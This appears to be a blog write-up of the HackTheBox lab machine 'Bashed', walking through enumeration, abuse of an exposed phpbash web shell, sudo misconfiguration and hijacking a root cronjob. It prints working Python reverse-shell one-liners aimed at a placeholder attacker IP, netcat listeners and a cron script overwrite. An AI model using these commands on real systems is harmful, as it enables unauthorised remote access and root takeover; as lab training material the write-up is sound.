+++
date = '2026-05-19T20:21:04+02:00'
draft = false
title = 'Bashed Writeup EN'
+++
**Name:** `joy.scd01`

**Date:** `20/01/2025`

![Bashed.png](/images/imgs_bashed/Bashed.png)

---
# Introduction

Bashed is an **easy Linux machine** that focuses on exploiting a vulnerable web application.

The box features a publicly accessible **web shell** that enables **remote command execution**, allowing for a straightforward initial foothold.

Privilege escalation is achieved by leveraging misconfigured **sudo permissions** and abusing a **scheduled cronjob**.

---
# Techniques Used

- _**Web Shell Abuse**_
- _**Sudo Misconfiguration**_
- _**Cronjob Hijacking**_

---
# Enumeration

## Nmap

Initial scan on all ports:

```bash
nmap -p- bashed
```

![nmap1.png](/images/imgs_bashed/nmap1.png)

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV bashed
```

![nmap2.png](/images/imgs_bashed/nmap2.png)

Only **port 80** was open, running an **Apache web server**.

---
## gobuster

So I launched a **directory scan** with **Gobuster**.

```bash
gobuster dir -u bashed -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
```

![gobuster.png](/images/imgs_bashed/gobuster.png)

Gobuster identified a few interesting resources.
Inside the `/dev` directory I found a file named **`phpbash.php`**

![phpbash.png](/images/imgs_bashed/phpbash.png)

Opening it gives us a **web-based shell** as the user `www-data`.

---
# Foothold

To get a proper shell:

1. Start a `netcat` listener:

```bash
nc -lnvp 22667
```

2. Execute this payload inside phpbash:

```bash
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("<attacker_IP>",<lport>));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

3. Shell received, then I upgraded it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![shell.png](/images/imgs_bashed/shell.png)

Inside **`/home/arrexel`**, I found the **user flag**.

![users.png](/images/imgs_bashed/users.png)

---
# Privilege Escalation

Next, I checked for **sudo permissions**:

```bash
sudo -l
```

![sudo_l.png](/images/imgs_bashed/sudo_l.png)

**`www-data`** can run any command as the user **`scriptmanager`** _without a password_.
So I switched to that user:

```bash
sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![user2.png](/images/imgs_bashed/user2.png)

**Note**: or simply `sudo -u scriptmanager /bin/bash`

---
## Enumerating Processes - pspy

I uploaded **pspy64** to monitor cronjobs:

1. From the attacker:

```bash
nc bashed 22667 < pspy64
```

2. On the victim:

```bash
nc -lvnp 22667 > pspy64
```

Made it executable and ran it:

![pspy.png](/images/imgs_bashed/pspy.png)
...
![cron.png](/images/imgs_bashed/cron.png)


`pspy` revealed a **root cronjob** executing **`test.py`**, which is **writable** by `scriptmanager`.

So, to get a **root shell**, I replaced the contents of `test.py` with a Python reverse shell:

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attacker_ip>',<lport>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i']);" > test.py
```

Moments later — root shell:

![root.png](/images/imgs_bashed/root.png)

---
# Final Thoughts

Bashed is the very first machine ever created on HackTheBox — a classic, linear box where everything falls into place as soon as you notice the exposed web shell.

Nothing particularly tricky on the privilege escalation either — the path is clean, predictable, and easy to follow.

Overall, this machine is a perfect first step into pentesting for beginners.
